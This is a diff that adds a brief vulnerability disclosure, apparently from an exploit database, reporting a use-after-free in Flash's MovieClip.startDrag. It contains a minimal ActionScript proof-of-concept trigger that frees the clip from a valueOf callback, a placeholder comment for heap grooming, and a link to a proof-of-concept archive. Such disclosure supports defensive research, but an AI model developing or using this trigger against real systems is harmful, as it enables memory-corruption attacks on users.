@@ -1,0 +1,26 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=592
+
+There is a use-after-free in MovieClip.startDrag. If a parameter an object with valueOf defined, this method can free the MovieClip, which is then used.
+
+A minimal POC follows:
+
+this.createEmptyMovieClip("mc", 1);
+mc.startDrag( true, {valueOf : func}, 1, 2, 3, 4);
+
+
+function func(){
+	
+	mc.removeMovieClip();
+	
+        // Fix heap here
+
+	return 1;
+	
+	}
+	
+A sample fla and swf are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39041.zip
+
